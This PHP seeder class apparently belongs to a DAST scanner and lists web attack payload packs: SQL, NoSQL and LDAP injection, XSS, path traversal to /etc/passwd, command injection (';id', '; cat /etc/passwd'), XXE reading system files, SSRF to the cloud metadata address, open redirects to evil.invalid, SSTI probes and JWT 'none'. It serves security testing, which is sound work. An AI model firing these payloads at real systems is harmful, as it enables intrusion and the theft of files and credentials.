<?php

namespace Database\Seeders;

/**
 * Known DAST payload packs. One catalog row per category+location holds many `values`.
 * The worker mapper expands each value into a job.
 */
final class AttackCatalogPayloads
{
    /**
     * @return list<string>
     */
    public static function sql(): array
    {
        return [
            "' OR 1=1 --",
            "' or 1=1--",
            "')) OR 1=1--",
            "' OR '1'='1",
            '" OR "1"="1',
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "admin'--",
            "' OR 1=1#",
            '1; SELECT 1--',
        ];
    }

    /**
     * @return list<string>
     */
    public static function xss(): array
    {
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<iframe src="javascript:alert(`xss`)">',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            'javascript:alert(1)',
            '<img src=x onerror=alert(document.domain)>',
            '<details open ontoggle=alert(1)>',
            '<math><mtext></mtext><script>alert(1)</script>',
            '{{constructor.constructor("alert(1)")()}}',
        ];
    }

    /**
     * @return list<string>
     */
    public static function path(): array
    {
        return [
            '../storage/secret.txt',
            'secret.txt',
            '../../etc/passwd',
            '....//....//etc/passwd',
            '/etc/passwd',
            '..\\..\\windows\\win.ini',
            'acquisitions.md',
            '....\/....\/etc/passwd',
        ];
    }

    /**
     * @return list<string>
     */
    public static function idorPath(): array
    {
        return ['1', '2', '3', '0', '100'];
    }

    /**
     * @return list<string>
     */
    public static function idorJson(): array
    {
        return [
            'idor-harness@shingeki.test',
            'jim@juice-sh.op',
            '2',
            '1',
        ];
    }

    /**
     * @return list<string>
     */
    public static function command(): array
    {
        return [
            ';id',
            '|id',
            '`id`',
            '$(id)',
            '|| id',
            '& id',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
        ];
    }

    /**
     * @return list<string>
     */
    public static function nosql(): array
    {
        return [
            '{"$gt":""}',
            '{"$ne":null}',
            '{"$regex":".*"}',
            '[$ne]=1',
            '{"$gt":0}',
            "' || '1'=='1",
            '{"$in":[""]}',
            '{"$where":"1==1"}',
        ];
    }

    /**
     * @return list<string>
     */
    public static function xxe(): array
    {
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">]><foo></foo>',
        ];
    }

    /**
     * @return list<string>
     */
    public static function ssrf(): array
    {
        return [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://169.254.169.254/latest/meta-data/',
            'http://[::1]/',
            'file:///etc/passwd',
            'http://127.0.0.1:22',
        ];
    }

    /**
     * @return list<string>
     */
    public static function ldap(): array
    {
        return [
            '*',
            '*)(&',
            '*)(uid=*))(|(uid=*',
            'admin)(&(password=*))',
            '*()|%26',
            'x"*"',
        ];
    }

    /**
     * @return list<string>
     */
    public static function csrf(): array
    {
        return [
            '',
            'missing',
            'null',
            '0',
        ];
    }

    /**
     * @return list<string>
     */
    public static function openRedirect(): array
    {
        return [
            'https://evil.invalid',
            'http://evil.invalid',
            '//evil.invalid',
            '/\\evil.invalid',
            'https://github.com/juice-shop/juice-shop.evil.invalid',
            'https://example.com',
            'https://owasp.org',
            '//google.com',
        ];
    }

    /**
     * @return list<string>
     */
    public static function ssti(): array
    {
        return [
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '<%= 7*7 %>',
            '{{config}}',
            '${{7*7}}',
            '{{7*\'7\'}}',
            '{php}echo 7*7;{/php}',
        ];
    }

    /**
     * @return list<string>
     */
    public static function jwt(): array
    {
        return [
            'none',
            'None',
            'NONE',
        ];
    }
}
